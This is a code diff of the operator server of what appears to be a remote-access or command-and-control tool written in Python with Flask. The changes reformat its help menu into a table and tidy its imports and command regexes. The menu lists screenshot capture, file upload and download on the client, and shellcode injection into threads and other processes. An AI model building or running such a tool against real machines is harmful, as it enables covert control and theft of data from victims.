@@ -14,7 +14,6 @@ import ssl
 import time
 import socket
 import logging
-import inquirer
 from flask import (
     Flask,
     abort,
@@ -27,12 +26,12 @@ from flask import (
 from PIL import Image
 from random import randint
 from binascii import hexlify
+from tabulate import tabulate
 from threading import Thread
 from importlib import reload
 from shellcodes import utils
 from collections import deque
 from flask_talisman import Talisman
-from inquirer.themes import GreenPassion
 from flask.logging import default_handler
 from base64 import urlsafe_b64encode as benc
 from argparse import (
@@ -50,6 +49,9 @@ from colorama import (
 from tornado.ioloop import IOLoop
 from tornado.wsgi import WSGIContainer
 from tornado.httpserver import HTTPServer
+if os.name != 'nt':
+    import inquirer
+    from inquirer.themes import GreenPassion
 
 # CONSOLE-COLORS
 B, D, RA = Style.BRIGHT, Style.DIM, Style.RESET_ALL
@@ -75,9 +77,9 @@ clientIP = ""
 emptyresponse = ('', 204)
 pastcmds, upload_contents, cmd_contents = deque(maxlen=10), "", ""
 
-help_cmd        = re.compile(r'^\s*help\s*')
-exit_cmd        = re.compile(r'^\s*exit\s*')
-clear_cmd       = re.compile(r'^\s*clear\s*')
+help_cmd        = re.compile(r'^\s*(help|\?)\s*$')
+exit_cmd        = re.compile(r'^\s*exit\s*$')
+clear_cmd       = re.compile(r'^\s*clear\s*$')
 unix_path       = re.compile(r'^\s*download\s*((.+/)*([^/]+))$')
 unix_upld       = re.compile(r'^\s*upload\s*(.+/)*([^/]+)$')
 wind_path       = re.compile(r'^\s*download\s*((.+\\)*([^/]+))$')
@@ -87,19 +89,19 @@ set_shellcode   = re.compile(r'^\s*set\s*shellcode\s*(\d+)\s*$')
 show_shellcodes = re.compile(r'^\s*show\s*shellcodes\s*$')
 
 # available commands...
-commands = f"""
-{B}help:{RA} show available commands.
-{B}h/history:{RA} interactive history command.
-{B}screenshot:{RA} captures a screenshot from the client.
-{B}upload <file or path to file>:{RA} uploads a file to the client.
-{B}download <file or path to file>:{RA} downloads a file from the client.
-{B}migrate <PID>:{RA} attempts to inject shellcode on the process with the specific PID.
-{B}inject shellcode:{RA} injects shellcode into a thread of the current process.
-{B}show shellcodes:{RA} shows all available to use shellcodes based on 'shellcodes/utils.py' script.
-{B}set shellcode <shellcode-id>:{RA} set shellcode to a custom shellcode specified by its id.
-{B}clear:{RA} clears the screen (it's the same for both unix and windows systems).
-{B}exit:{RA} closes the connection with the client.
-"""
+commands = [
+    [f"{B}?/help{RA}", "Help menu"],
+    [f"{B}h/history{RA}", "Interactive command-history"],
+    [f"{B}screenshot{RA}", "Captures a client-screenshot"],
+    [f"{B}upload <(path to) file>{RA}", "Uploads a file to the client"],
+    [f"{B}download <(path to) file>{RA}", "Downloads a file from the client"],
+    [f"{B}migrate <PID>{RA}", "Injects shellcode to a process with the specific PID"],
+    [f"{B}inject shellcode{RA}", "Injects shellcode into a thread of the current process"],
+    [f"{B}show shellcodes{RA}", "Shows all available to use shellcodes"],
+    [f"{B}set shellcode <id>{RA}", "Sets shellcode to a custom shellcode specified by its id"],
+    [f"{B}clear{RA}", "Clears the screen"],
+    [f"{B}exit{RA}", "Closes the connection with the client"]
+]
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = hexlify(os.urandom(16)) # you can change that to something permanent...
@@ -323,7 +325,7 @@ def handleGET():
                     print(f"[x] There is no shellcode with id: {shc_id}")
                     return emptyresponse
             elif help_cmd.match(cmd):
-                print(commands[1:-1])
+                print(tabulate(commands, headers=["Command","Description"]))
                 return emptyresponse
             elif exit_cmd.match(cmd):
                 cmd_contents = cmd
